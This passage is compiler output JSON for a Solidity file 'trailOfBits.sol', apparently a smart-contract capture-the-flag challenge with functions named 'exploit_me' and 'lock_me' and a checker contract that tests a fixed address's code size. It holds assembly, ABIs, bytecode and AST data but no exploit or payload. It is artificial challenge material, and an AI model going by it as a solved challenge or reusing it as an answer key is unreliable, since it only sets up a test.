											"end": 1526,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1433,
											"end": 1438,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1471,
											"end": 1477,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1458,
											"end": 1478,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 1449,
											"end": 1478,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1449,
											"end": 1478,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1487,
											"end": 1520,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 1514,
											"end": 1519,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1487,
											"end": 1520,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1487,
											"end": 1520,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1487,
											"end": 1520,
											"name": "tag",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 1487,
											"end": 1520,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1591,
											"end": 1597,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1640,
											"end": 1642,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1628,
											"end": 1637,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1619,
											"end": 1626,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1615,
											"end": 1638,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1611,
											"end": 1643,
											"name": "SLT",
											"source": 1
										},
										{
											"begin": 1608,
											"end": 1727,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1608,
											"end": 1727,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 1608,
											"end": 1727,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1646,
											"end": 1725,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 1646,
											"end": 1725,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 1646,
											"end": 1725,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1646,
											"end": 1725,
											"name": "tag",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 1646,
											"end": 1725,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1608,
											"end": 1727,
											"name": "tag",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 1608,
											"end": 1727,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1766,
											"end": 1767,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1791,
											"end": 1844,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 1836,
											"end": 1843,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1827,
											"end": 1833,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1816,
											"end": 1825,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1812,
											"end": 1834,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1791,
											"end": 1844,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1791,
											"end": 1844,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1791,
											"end": 1844,
											"name": "tag",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 1791,
											"end": 1844,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1781,
											"end": 1844,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1781,
											"end": 1844,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1737,
											"end": 1854,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1867,
											"end": 1985,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 1867,
											"end": 1985,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1954,
											"end": 1978,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "70"
										},
										{
											"begin": 1972,
											"end": 1977,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1954,
											"end": 1978,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 1954,
											"end": 1978,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1954,
											"end": 1978,
											"name": "tag",
											"source": 1,
											"value": "70"
										},
										{
											"begin": 1954,
											"end": 1978,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1949,
											"end": 1952,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1942,
											"end": 1979,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1867,
											"end": 1985,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1867,
											"end": 1985,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1867,
											"end": 1985,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2084,
											"end": 2088,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2122,
											"end": 2124,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2111,
											"end": 2120,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2107,
											"end": 2125,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2099,
											"end": 2125,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2099,
											"end": 2125,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2135,
											"end": 2206,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "72"
										},
										{
											"begin": 2203,
											"end": 2204,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2192,
											"end": 2201,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2188,
											"end": 2205,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2179,
											"end": 2185,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 2135,
											"end": 2206,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 2135,
											"end": 2206,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2135,
											"end": 2206,
											"name": "tag",
											"source": 1,
											"value": "72"
										},
										{
											"begin": 2135,
											"end": 2206,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "tag",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2320,
											"end": 2331,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2357,
											"end": 2360,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2342,
											"end": 2360,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2342,
											"end": 2360,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2372,
											"end": 2486,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 2372,
											"end": 2486,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2372,
											"end": 2486,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2372,
											"end": 2486,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2651,
											"end": 2654,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2672,
											"end": 2755,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "76"
										},
										{
											"begin": 2753,
											"end": 2754,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2748,
											"end": 2751,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2672,
											"end": 2755,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 2672,
											"end": 2755,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2672,
											"end": 2755,
											"name": "tag",
											"source": 1,
											"value": "76"
										},
										{
											"begin": 2672,
											"end": 2755,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2665,
											"end": 2755,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2665,
											"end": 2755,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2764,
											"end": 2857,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "77"
										},
										{
											"begin": 2853,
											"end": 2856,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2764,
											"end": 2857,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 2764,
											"end": 2857,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2764,
											"end": 2857,
											"name": "tag",
											"source": 1,
											"value": "77"
										},
										{
											"begin": 2764,
											"end": 2857,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2882,
											"end": 2883,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2877,
											"end": 2880,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2873,
											"end": 2884,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2866,
											"end": 2884,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2866,
											"end": 2884,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3080,
											"end": 3083,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3102,
											"end": 3249,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "79"
										},
										{
											"begin": 3245,
											"end": 3248,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3102,
											"end": 3249,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 3102,
											"end": 3249,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3102,
											"end": 3249,
											"name": "tag",
											"source": 1,
											"value": "79"
										},
										{
											"begin": 3102,
											"end": 3249,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3095,
											"end": 3249,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3095,
											"end": 3249,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3266,
											"end": 3269,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3259,
											"end": 3269,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3259,
											"end": 3269,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"exploit_me(address)": "548853a0",
							"lock_me()": "4c228cc7",
							"winners(uint256)": "a2fb1175"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"winner\",\"type\":\"address\"}],\"name\":\"exploit_me\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lock_me\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"winners\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"trailOfBits.sol\":\"Challenge\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"trailOfBits.sol\":{\"keccak256\":\"0xb3f79e0569a3997dd41d576251423a91bf0645cbffc4178ef7b0a3f444095423\",\"urls\":[\"bzz-raw://65cb25c28cf66246e80cfe2ab6cfb2e72cf43aa4493b48768c8349c227fc2243\",\"dweb:/ipfs/QmQ97WoVEeqYghJjXRs3naJGdoStgWsvZQGq7hgQ65BPyE\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 15,
								"contract": "trailOfBits.sol:Challenge",
								"label": "winners",
								"offset": 0,
								"slot": "0",
								"type": "t_array(t_address)dyn_storage"
							},
							{
								"astId": 17,
								"contract": "trailOfBits.sol:Challenge",
								"label": "lock",
								"offset": 0,
								"slot": "1",
								"type": "t_bool"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_array(t_address)dyn_storage": {
								"base": "t_address",
								"encoding": "dynamic_array",
								"label": "address[]",
								"numberOfBytes": "32"
							},
							"t_bool": {
								"encoding": "inplace",
								"label": "bool",
								"numberOfBytes": "1"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"IChallenge": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "winner",
									"type": "address"
								}
							],
							"name": "exploit_me",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "lock_me",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"exploit_me(address)": "548853a0",
							"lock_me()": "4c228cc7"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"winner\",\"type\":\"address\"}],\"name\":\"exploit_me\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lock_me\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"trailOfBits.sol\":\"IChallenge\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"trailOfBits.sol\":{\"keccak256\":\"0xb3f79e0569a3997dd41d576251423a91bf0645cbffc4178ef7b0a3f444095423\",\"urls\":[\"bzz-raw://65cb25c28cf66246e80cfe2ab6cfb2e72cf43aa4493b48768c8349c227fc2243\",\"dweb:/ipfs/QmQ97WoVEeqYghJjXRs3naJGdoStgWsvZQGq7hgQ65BPyE\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"checker": {
					"abi": [
						{
							"inputs": [],
							"name": "check",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"trailOfBits.sol\":574:804  contract checker {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"trailOfBits.sol\":574:804  contract checker {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x919840ad\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"trailOfBits.sol\":600:801  function check() public returns (bool) {... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      mload(0x40)\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_5:\n        /* \"trailOfBits.sol\":633:637  bool */\n      0x00\n        /* \"trailOfBits.sol\":650:659  uint size */\n      dup1\n        /* \"trailOfBits.sol\":714:756  0xaE036c65C649172b43ef7156b009c6221B596B8b */\n      0xae036c65c649172b43ef7156b009c6221b596b8b\n        /* \"trailOfBits.sol\":702:757  extcodesize(0xaE036c65C649172b43ef7156b009c6221B596B8b) */\n      extcodesize\n        /* \"trailOfBits.sol\":694:757  size := extcodesize(0xaE036c65C649172b43ef7156b009c6221B596B8b) */\n      swap1\n      pop\n        /* \"trailOfBits.sol\":792:793  0 */\n      0x00\n        /* \"trailOfBits.sol\":785:789  size */\n      dup2\n        /* \"trailOfBits.sol\":785:793  size > 0 */\n      gt\n        /* \"trailOfBits.sol\":778:793  return size > 0 */\n      swap2\n      pop\n      pop\n        /* \"trailOfBits.sol\":600:801  function check() public returns (bool) {... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:97   */\n    tag_9:\n        /* \"#utility.yul\":41:48   */\n      0x00\n        /* \"#utility.yul\":84:89   */\n      dup2\n        /* \"#utility.yul\":77:90   */\n      iszero\n        /* \"#utility.yul\":70:91   */\n      iszero\n        /* \"#utility.yul\":59:91   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:97   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":103:212   */\n    tag_10:\n        /* \"#utility.yul\":184:205   */\n      tag_14\n        /* \"#utility.yul\":199:204   */\n      dup2\n        /* \"#utility.yul\":184:205   */\n      tag_9\n      jump\t// in\n    tag_14:\n        /* \"#utility.yul\":179:182   */\n      dup3\n        /* \"#utility.yul\":172:206   */\n      mstore\n        /* \"#utility.yul\":103:212   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":218:428   */\n    tag_7:\n        /* \"#utility.yul\":305:309   */\n      0x00\n        /* \"#utility.yul\":343:345   */\n      0x20\n        /* \"#utility.yul\":332:341   */\n      dup3\n        /* \"#utility.yul\":328:346   */\n      add\n        /* \"#utility.yul\":320:346   */\n      swap1\n      pop\n        /* \"#utility.yul\":356:421   */\n      tag_16\n        /* \"#utility.yul\":418:419   */\n      0x00\n        /* \"#utility.yul\":407:416   */\n      dup4\n        /* \"#utility.yul\":403:420   */\n      add\n        /* \"#utility.yul\":394:400   */\n      dup5\n        /* \"#utility.yul\":356:421   */\n      tag_10\n      jump\t// in\n    tag_16:\n        /* \"#utility.yul\":218:428   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122026ff7e27a46e17c57534d6622163bbce03224ba582aad476e5f4cb980457356264736f6c634300080a0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060d48061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063919840ad14602d575b600080fd5b60336047565b604051603e91906085565b60405180910390f35b60008073ae036c65c649172b43ef7156b009c6221b596b8b3b90506000811191505090565b60008115159050919050565b607f81606c565b82525050565b6000602082019050609860008301846078565b9291505056fea264697066735822122026ff7e27a46e17c57534d6622163bbce03224ba582aad476e5f4cb980457356264736f6c634300080a0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xD4 DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x919840AD EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x47 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x3E SWAP2 SWAP1 PUSH1 0x85 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH20 0xAE036C65C649172B43EF7156B009C6221B596B8B EXTCODESIZE SWAP1 POP PUSH1 0x0 DUP2 GT SWAP2 POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x7F DUP2 PUSH1 0x6C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH1 0x98 PUSH1 0x0 DUP4 ADD DUP5 PUSH1 0x78 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x26 SELFDESTRUCT PUSH31 0x27A46E17C57534D6622163BBCE03224BA582AAD476E5F4CB98045735626473 PUSH16 0x6C634300080A00330000000000000000 ",
							"sourceMap": "574:230:0:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@check_68": {
									"entryPoint": 71,
									"id": 68,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 120,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": 133,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 108,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:431:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "49:48:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "59:32:1",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "84:5:1"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "77:6:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "77:13:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "70:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "70:21:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "59:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "31:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "41:7:1",
														"type": ""
													}
												],
												"src": "7:90:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "162:50:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "179:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "199:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "184:14:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "184:21:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "172:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "172:34:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "172:34:1"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "150:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "157:3:1",
														"type": ""
													}
												],
												"src": "103:109:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "310:118:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "320:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "332:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "343:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "328:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "328:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "320:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "394:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "407:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "418:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "403:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "403:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
